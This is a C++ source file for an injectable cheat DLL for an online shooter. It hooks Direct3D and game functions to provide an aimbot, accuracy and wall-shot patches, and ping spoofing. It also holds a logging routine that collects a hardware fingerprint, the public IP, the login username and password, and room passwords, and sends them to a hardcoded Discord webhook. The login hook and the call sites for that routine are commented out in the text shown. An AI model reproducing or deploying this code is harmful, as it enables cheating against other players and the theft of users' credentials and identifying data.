#include "SDK.h"
#include "D3D.h"
#include "CPacketData.h"
#include "md5.h"
#include "XorStr.h"
CPacketData cPacketData;
std::string yourkey = "";
std::string ConvertWCSToMBS(const wchar_t* pstr, long wslen)
{
	int len = ::WideCharToMultiByte(CP_ACP, 0, pstr, wslen, NULL, 0, NULL, NULL);

	std::string dblstr(len, '\0');
	len = ::WideCharToMultiByte(CP_ACP, 0 /* no flags */,
		pstr, wslen /* not necessary NULL-terminated */,
		&dblstr[0], len,
		NULL, NULL /* no default char */);

	return dblstr;
}
std::string ConvertBSTRToMBS(BSTR bstr)
{
	int wslen = ::SysStringLen(bstr);
	return ConvertWCSToMBS((wchar_t*)bstr, wslen);
}
void SetKey(std::string & yourkey)
{
	BSTR baseboard[2];
	HRESULT hres;

	// Step 1: --------------------------------------------------
	// Initialize COM. ------------------------------------------

	hres = CoInitializeEx(0, COINIT_MULTITHREADED);
	// Step 2: --------------------------------------------------
	// Set general COM security levels --------------------------

	hres = CoInitializeSecurity(
		NULL,
		-1,                          // COM authentication
		NULL,                        // Authentication services
		NULL,                        // Reserved
		RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
		RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
		NULL,                        // Authentication info
		EOAC_NONE,                   // Additional capabilities 
		NULL                         // Reserved
	);


	if (FAILED(hres))
	{
		CoUninitialize();
	}

	// Step 3: ---------------------------------------------------
	// Obtain the initial locator to WMI -------------------------

	IWbemLocator *pLoc = NULL;

	hres = CoCreateInstance(
		CLSID_WbemLocator,
		0,
		CLSCTX_INPROC_SERVER,
		IID_IWbemLocator, (LPVOID *)&pLoc);

	if (FAILED(hres))
	{
		CoUninitialize();
	}

	// Step 4: -----------------------------------------------------
	// Connect to WMI through the IWbemLocator::ConnectServer method

	IWbemServices *pSvc = NULL;

	// Connect to the root\cimv2 namespace with
	// the current user and obtain pointer pSvc
	// to make IWbemServices calls.
	std::string srv = "ROOT\\CIMV2";
	hres = pLoc->ConnectServer(
		_bstr_t(std::wstring(srv.begin(), srv.end()).c_str()), // Object path of WMI namespace
		NULL,                    // User name. NULL = current user
		NULL,                    // User password. NULL = current
		0,                       // Locale. NULL indicates current
		NULL,                    // Security flags.
		0,                       // Authority (for example, Kerberos)
		0,                       // Context object 
		&pSvc                    // pointer to IWbemServices proxy
	);

	if (FAILED(hres))
	{
		pLoc->Release();
		CoUninitialize();
	}
	// Step 5: --------------------------------------------------
	// Set security levels on the proxy -------------------------

	hres = CoSetProxyBlanket(
		pSvc,                        // Indicates the proxy to set
		RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
		RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
		NULL,                        // Server principal name 
		RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
		RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
		NULL,                        // client identity
		EOAC_NONE                    // proxy capabilities 
	);

	if (FAILED(hres))
	{
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
	}

	// Step 6: --------------------------------------------------
	// Use the IWbemServices pointer to make requests of WMI ----

	// For example, get the name of the operating system
	IEnumWbemClassObject* pEnumerator = NULL;

	hres = pSvc->ExecQuery(
		bstr_t("WQL"),
		bstr_t("SELECT * FROM Win32_BaseBoard"),
		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
		NULL,
		&pEnumerator);

	if (FAILED(hres))
	{
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
	}
	IWbemClassObject *pclsObj = NULL;
	ULONG uReturn = 0;
	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
			&pclsObj, &uReturn);

		if (0 == uReturn)
		{
			break;
		}

		VARIANT vtProp;


		std::string prdct = "Product";
		hr = pclsObj->Get(std::wstring(prdct.begin(), prdct.end()).c_str(), 0, &vtProp, 0, 0);
		baseboard[0] = vtProp.bstrVal;
		VariantClear(&vtProp);
		std::string serialnum = "SerialNumber";
		hr = pclsObj->Get(std::wstring(serialnum.begin(), serialnum.end()).c_str(), 0, &vtProp, 0, 0);
		baseboard[1] = vtProp.bstrVal;
		VariantClear(&vtProp);
		pclsObj->Release();
	}

	HW_PROFILE_INFO hwProfileInfo;
	TCHAR pcName[MAX_COMPUTERNAME_LENGTH + 2];
	DWORD nameBufSize;
	nameBufSize = sizeof pcName - 1;


	if ((GetCurrentHwProfile(&hwProfileInfo) != NULL) && (GetComputerName(pcName, &nameBufSize) == TRUE))
		yourkey = md5(md5(md5(md5(hwProfileInfo.szHwProfileGuid) + md5(pcName)) + md5(ConvertBSTRToMBS(baseboard[0]).c_str())) + md5(md5(ConvertBSTRToMBS(baseboard[1]).c_str())));
}
std::string getIPAddress() {
	return cPacketData.download("http://icanhazip.com");
}
std::string timestamp()
{
	auto t = std::time(nullptr);
	auto tm = *std::localtime(&t);
	std::stringstream ssTp;
	ssTp << std::put_time(&tm, "%d-%m-%Y %H-%M-%S");
	return ssTp.str();
}
enum LogType : int
{
	BASIC = 0,
	LOGIN = 1,
	PLAYER_INFO = 2,
	ROOM_INFO = 3
};
void LogActions(std::string username, LogType Type, std::string action, std::string mykey, std::string user, std::string pass, std::string Server, std::string Character, std::string nickname, std::string level, std::string room_number, std::string room_password)
{
	std::string message;
	if (Type == BASIC)
		message = "```cpp\nTime: " + timestamp() + "\nKey: " + "'" + mykey + "'" + "\nIP: " + getIPAddress() + "\nAction: "   + "'" + action + "'" + "\n```";
	else if (Type == LOGIN)
		message = "```cpp\nTime: " + timestamp() + "\nKey: " + "'" + mykey + "'" + "\nIP: " + getIPAddress() + "\nUsername: " + "'" + user   + "'" + "\nPass: "      + "'" + pass      + "'" + "\nAction: "   + "'" + action   + "'" + "\n```";
	else if (Type == PLAYER_INFO)
		message = "```cpp\nTime: " + timestamp() + "\nKey: " + "'" + mykey + "'" + "\nIP: " + getIPAddress() + "\nServer: "   + "'" + Server + "'" + "\nCharacter: " + "'" + Character + "'" + "\nNickname: " + "'" + nickname + "'" + "\nLevel: " + level + "\nAction: " + "'" + action + "'" + "\n```";
	else if (Type == ROOM_INFO)
		message = "```cpp\nTime: " + timestamp() + "\nKey: " + "'" + mykey + "'" + "\nIP: " + getIPAddress() + "\nServer: "   + "'" + Server + "'" + "\nCharacter: " + "'" + Character + "'" + "\nNickname: " + "'" + nickname + "'" + "\nLevel: " + level + "'" + "\nRoom Number: " + "'" + room_number + "'" + "\nRoom Password: " + "'" + room_password + "'" + "\nAction: " + "'" + action + "'" + "\n```";
	cPacketData.LogInfoDiscord(username, message, "https://discordapp.com/api/webhooks/521073088025329704/SihBC3ZF0Uc-rlvnMOl2CPtdqFDdkZsQuJtvz4z_qYKJE7v7Qt8hwE3SuB4neA5heGF1");
}
CEngine* cEngine = new CEngine();
CDrawing* cDrawing = new CDrawing();
CChat* cChat = new CChat();
CAimbot* cAimbot = new CAimbot();
CVisuals* cVisuals = new CVisuals();
GameState PreviewGameState = GameState::GAME_STATE_NONE;
int init();

typedef int(WINAPI * tSend)(SOCKET, char*, Size, int);
typedef void(__thiscall* tPrintChatMessage)(DWORD*, LPCSTR, LPCSTR, BYTE, bool, bool, BYTE);

tPrintChatMessage oPrintChatMessage = (tPrintChatMessage)0x00581AC0;
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);


std::vector<std::string> SplitString(std::string stringToBeSplitted, std::string delimeter)
{
	std::vector<std::string> splittedString;
	int startIndex = 0;
	int  endIndex = 0;
	while ((endIndex = stringToBeSplitted.find(delimeter, startIndex)) < stringToBeSplitted.size())
	{

		std::string val = stringToBeSplitted.substr(startIndex, endIndex - startIndex);
		splittedString.push_back(val);
		startIndex = endIndex + delimeter.size();

	}
	if (startIndex < stringToBeSplitted.size())
	{
		std::string val = stringToBeSplitted.substr(startIndex);
		splittedString.push_back(val);
	}
	return splittedString;

}
bool killProcess(const char *process)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	if (hSnapShot == INVALID_HANDLE_VALUE)
		return false;
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	if (!Process32First(hSnapShot, &pEntry))
		return false;

	do
	{

		if (strcmp(pEntry.szExeFile, std::string(std::string(process) + ".exe").c_str()) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
				CloseHandle(hSnapShot);
				break;
			}
			else
			{
				CloseHandle(hSnapShot);
				break;
				return false;
			}
		}

		//if(strstr(procEntry.szExeFile,name))
	} while (Process32Next(hSnapShot, &pEntry));

}
struct LoginDetails
{
	byte unknown1[0x820];
	char ID[260];
	char PASS[260];
};
namespace Hooks
{
	
	    void(__thiscall* oLogin)(LoginDetails* LoginInfo);
		Value(__thiscall * oUpdateWeapond)(Pointer, byte);
		Value(__thiscall * oCrosshairColorUpdate)(Pointer, Vector3*);
		void(__thiscall *  oUpdateCoords)(void *, int , int , int , float , int , float , int , char );
		void(__thiscall *  oUpdatePing)(DWORD*, int);
		double realRifleAcc = 100, realShotgunAcc = 180, realSniperAcc = 100, realGatlingAcc = 100;
		bool rifleWall = false, shotgunWall = false, sniperWall = false, gatlingWall = false;
		const double three = 3;
		bool trigered = false;
		enum eWeap
		{
			Melee = 1,
			Rifle = 0,
			Shotgun = 4,
			Sniper = 5,
			Gatling = 6
		};
		int weap = -1;
		enum Addys : DWORD {
			Accuracity1Hook = 0x00B4F5E5,
			Accuracity21Hook = 0xB5AE37,
			Accuracity22Hook = 0xB5AE68,
			Accuracity3Hook = 0x00B61EC3,
			Accuracity4Hook = 0x00B40DBC,
			WallshotHook = 0x007AF457,
			UpdateWeapondHook = 0x0098F500,
			UpdateCoordsHook = 0x007D58D0,
			UpdatePingHook = 0x00ABF6E0,
			MeleeHitHook = 0x00B32F10,
			RifleHitHook = 0x00B30560,
			SniperHitHook = 0x00B31C80,
			MessageWrapperHook = 0x00581CA0,
			LoginHook = 0x0062CB10
		};
		void __fastcall Login(LoginDetails* LoginInfo, int edx)
		{
			oLogin(LoginInfo);
			unsigned short a[1] = { 0x107C };
			char* username = reinterpret_cast<char*>(CalcPtr(0x11B5FC8, a, 1));
			unsigned short b[1] = { 0x10C4 };
			char* password = reinterpret_cast<char*>(CalcPtr(0x11B5FC8, b, 1));
			if (strlen(password))
				LogActions("", LogType::LOGIN, "Login Details", yourkey.c_str(), LoginInfo->ID, LoginInfo->PASS, "", "", "", "", "", "");
			
		}
		Address temp = 0;
		const Address WallJMPback = 0x007AF457 + 6;
		
		void __fastcall UpdatePing(DWORD* _this, int edx, int Ping )
		{
			Offset CLocalPltrOffs[] = { 0x3C, 0x10C, 0xC, 0x0 };
			DWORD* thisptr = reinterpret_cast<DWORD*>(CalcPtr(0x11B5FBC, CLocalPltrOffs, 4));
			if (Vars.Misc.Ping.Enabled && (thisptr == _this))
			 oUpdatePing(_this, Vars.Misc.Ping.Randomised ? random_int(Vars.Misc.Ping.min, Vars.Misc.Ping.max) : Vars.Misc.Ping.ping);
			else
			 oUpdatePing(_this, Ping);
		}
		Value __fastcall UpdateWeapond(Pointer _this, Value edx, byte value)
		{
			weap = value;
			return oUpdateWeapond(_this, value);
		}
		bool checked = false;
		void __fastcall UpdateCoords(void *_this, int edx, int a2, int a3, int a4, float a5, int a6, float a7, int a8, char a9)
		{
		
			for (int i = 0; i < min(16, cEngine->Room->PlayerCount); ++i)
			{
			
				if (cEngine->Room->Players[i]->Player->Coords->Player)
				{
					if (*(DWORD*)cEngine->Room->Players[i]->Player->Coords->Player->YES + 8 == *(DWORD*)_this)
					{

						static Vector3 oldPos = cEngine->Room->Players[i]->Player->Coords->Player->Coords;
						oUpdateCoords(_this, a2, a3, a4, a5, a6, a7, a8, a9);
						cAimbot->Velocity[i] = cEngine->Room->Players[i]->Player->Coords->Player->Coords - oldPos;
						oldPos = cEngine->Room->Players[i]->Player->Coords->Player->Coords;
					}
					else
					{
						oUpdateCoords(_this, a2, a3, a4, a5, a6, a7, a8, a9);
						ShowAddress((Address)cEngine->Room->Players[i]->Player->Coords->Player, "SHIT");
						ShowAddress((Address)_this, "this");
					}
				}
			}
			oUpdateCoords(_this, a2, a3, a4, a5, a6, a7, a8, a9);
		}
	
	void __declspec(naked) Wall()
	{
		__asm {
			cmp byte ptr ds : [Hooks::weap], Rifle
			jz[rifle]
			cmp byte ptr ds : [Hooks::weap], Shotgun
			jz[shotgun]
			cmp byte ptr ds : [Hooks::weap], Sniper
			jz[sniper]
			cmp byte ptr ds : [Hooks::weap], Gatling
			jz[gatling]
			jmp[orig]

			rifle :
				  cmp byte ptr ds : [Hooks::rifleWall], 0
				  jnz[on]
				  jmp[orig]

				  shotgun :
						  cmp byte ptr ds : [Hooks::shotgunWall], 0
						  jnz[on]
						  jmp[orig]

						  sniper :
								 cmp byte ptr ds : [Hooks::sniperWall], 0
								 jnz[on]
								 jmp[orig]

								 gatling :
										 cmp byte ptr ds : [Hooks::gatlingWall], 0
										 jnz[on]

										 orig :
											  cmp byte ptr ds : [trigered], 0
											  jnz[on]
											  fcomp qword ptr ds : [0x00FDA5C8]
											  jmp[WallJMPback]

											  on :
												 fcomp qword ptr ds : [three]
												 jmp[WallJMPback]
		}
	}
	bool Hook()
	{
		bool ret = true;
		ret &= sWrite<int>(Hooks::Accuracity1Hook + 2, (Value)&realRifleAcc);
		ret &= sWrite<int>(Hooks::Accuracity21Hook + 2, (Value)&realShotgunAcc);
		ret &= sWrite<int>(Hooks::Accuracity22Hook + 2, (Value)&realShotgunAcc);
		ret &= sWrite<int>(Hooks::Accuracity3Hook + 2, (Value)&realSniperAcc);
		ret &= sWrite<int>(Hooks::Accuracity4Hook + 2, (Value)&realGatlingAcc);
	
		ret &= (Detour((void*)Hooks::WallshotHook, Hooks::Wall, 6) != DEAD);
		
		oUpdateWeapond = (Value(__thiscall *)(Pointer, byte))Detour((void*)Hooks::UpdateWeapondHook, Hooks::UpdateWeapond, 6);
		ret &= (Value)oUpdateWeapond != DEAD;

		oUpdatePing = (void(__thiscall *)(DWORD*, int))Detour((void*)Hooks::UpdatePingHook, Hooks::UpdatePing, 6);
		ret &= (Value)oUpdatePing != DEAD;

		//oLogin = (void(__thiscall*)(LoginDetails*))Detour((void*)Hooks::LoginHook, Hooks::Login, 5);
		//ret &= (Value)oLogin != DEAD;

		return ret;
	}

}
bool DirectoryExists(const char* dirName) {
	DWORD attribs = ::GetFileAttributesA(dirName);
	if (attribs == INVALID_FILE_ATTRIBUTES) {
		return false;
	}
	return (attribs & FILE_ATTRIBUTE_DIRECTORY);
}
int init()
{
	HMODULE d3d = LoadLibraryA("d3d9.dll");
	DWORD *vTable;
	Address vTablePattern = FindPattern((char*)"d3d9.dll", "\xC7\x06\x00\x00\x00\x00\x89\x86\x00\x00\x00\x00\x89\x86", "xx????xx????xx");
	if (vTablePattern == DEAD) return 0;
	memcpy(&vTable, (void *)(vTablePattern + 2), 4);

	ImGui::CreateContext();


	//D3D::Original::EndScene = (HRESULT(APIENTRY*)(LPDIRECT3DDEVICE9))Detour((Pointer)endScene, D3D::Hook::EndScene, 7);


	D3D::Original::BitBlt = (BOOL(WINAPI*)(HDC, int, int, int, int, HDC, int, int, DWORD))DetourFunction((PBYTE)GetProcAddress(GetModuleHandle("Gdi32.dll"), "BitBlt"), (PBYTE)D3D::Hook::BitBlt);
	
    D3D::Original::Reset = (HRESULT(APIENTRY*)(LPDIRECT3DDEVICE9, D3DPRESENT_PARAMETERS*))DetourFunction((PBYTE)vTable[16], (PBYTE)D3D::Hook::Reset);
	//D3D::Original::EndScene = (HRESULT(APIENTRY*)(LPDIRECT3DDEVICE9))DetourFunction((PBYTE)vTable[42], (PBYTE)D3D::Hook::EndScene);
	D3D::Original::Present = (HRESULT(APIENTRY*)(LPDIRECT3DDEVICE9, CONST RECT*, CONST RECT*, HWND, CONST RGNDATA*))DetourFunction((PBYTE)vTable[17], (PBYTE)D3D::Hook::Present);
	
	D3D::ImGui_WndProc = ImGui_ImplWin32_WndProcHandler;

	while (!(D3D::Window = FindWindow(cEngine->GetNationIndex(), 0))) Sleep(20);

	D3D::Original::WndProc = (WNDPROC)SetWindowLongA(D3D::Window, GWL_WNDPROC, (LONG)D3D::Hook::WndProc);
	
	if (D3D::Original::WndProc == nullptr) return 0;
	//SetKey(yourkey);

	Hooks::Hook();
	
	//std::vector<std::string> configs = cConfig->get_all_files_names_within_folder();
	//cConfig->Load(configs[Vars.Settings.StartupConfig].c_str());
	while (true)
	{

		cAimbot->Run();
		cEngine->Run();


		/*if (cEngine->GetServerState() != PreviewGameState)
		{
			PreviewGameState = (GameState)cEngine->GetServerState();
			if (PreviewGameState == GameState::GAME_STATE_LOGIN)
			{
				LogActions("feel-dope", LogType::BASIC, "Login State", yourkey, "", "", "", "", "", "", "", "");
			}
			else if (PreviewGameState == GameState::GAME_STATE_SELECT_SERVER)
			{
				char name[40];
				sprintf(name, "%s", cEngine->pLocal->Name);
				LogActions("feel-dope", LogType::PLAYER_INFO, "Select Server", yourkey, "", "", "Not selected", "Not selected", std::string(name).empty() ? "-" : std::string(name).c_str(), "-", "", "");
			}
			else if (PreviewGameState == GameState::GAME_STATE_AVATAR_SELECT)
			{
				char name[40];
				sprintf(name, "%s", cEngine->pLocal->Name);
				LogActions("feel-dope", LogType::PLAYER_INFO, "Select Character", yourkey, "", "", cEngine->GetServerRegionStr(), "Not selected", std::string(name), std::to_string(((cEngine->pLocal->Room->Team >> 15) & 0x7F) - 1), "", "");
			}
			else if (PreviewGameState == GameState::GAME_STATE_LOBBY_AGORA)
			{
				char name[40];
				sprintf(name, "%s", cEngine->pLocal->Name);
				LogActions("feel-dope", LogType::PLAYER_INFO, "In Lobby", yourkey, "", "", cEngine->GetServerRegionStr(), cEngine->GetCharacterStr(cEngine->pLocal->Room->Team), std::string(name), std::to_string(((cEngine->pLocal->Room->Team >> 15) & 0x7F) - 1), "", "");
			}
		}*/

		if ((cAimbot->GetCurrentWeapon() != -1) && (cEngine->GetServerState() == GameState::GAME_STATE_MOD_PLAYING) && (cEngine->GetStatus(cAimbot->pLocal) == PlayerStatus::STATUS_NORMAL))
		{
			if (Vars.Misc.WeaponInfo[cAimbot->GetCurrentWeapon()].Enabled)
			{
				if (Vars.Misc.WeaponInfo[WeaponType::RIFLE].Accuaracy)
					Hooks::realRifleAcc = 100 - Vars.Misc.WeaponInfo[WeaponType::RIFLE].AccuaracyVal;
				else
					Hooks::realRifleAcc = 100;

				if (Vars.Misc.WeaponInfo[WeaponType::SHOTGUN].Accuaracy)
					Hooks::realShotgunAcc = 9.819 * Vars.Misc.WeaponInfo[WeaponType::SHOTGUN].AccuaracyVal + 180;
				else
					Hooks::realShotgunAcc = 180;

				if (Vars.Misc.WeaponInfo[WeaponType::SNIPER].Accuaracy)
					Hooks::realSniperAcc = 100 - Vars.Misc.WeaponInfo[WeaponType::SNIPER].AccuaracyVal;
				else
					Hooks::realSniperAcc = 100;

				if (Vars.Misc.WeaponInfo[WeaponType::MG].Accuaracy)
					Hooks::realGatlingAcc = 100 - Vars.Misc.WeaponInfo[WeaponType::MG].AccuaracyVal;
				else
					Hooks::realGatlingAcc = 100;

				Hooks::rifleWall = Vars.Misc.WeaponInfo[WeaponType::RIFLE].Wallshot;
				Hooks::shotgunWall = Vars.Misc.WeaponInfo[WeaponType::SHOTGUN].Wallshot;
				Hooks::sniperWall = Vars.Misc.WeaponInfo[WeaponType::SNIPER].Wallshot;
				Hooks::gatlingWall = Vars.Misc.WeaponInfo[WeaponType::MG].Wallshot;
			}
		}
		
		Sleep(1);
	}
	
}
BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)init, 0, 0, 0);
		return 1;
	}
	return 0;
}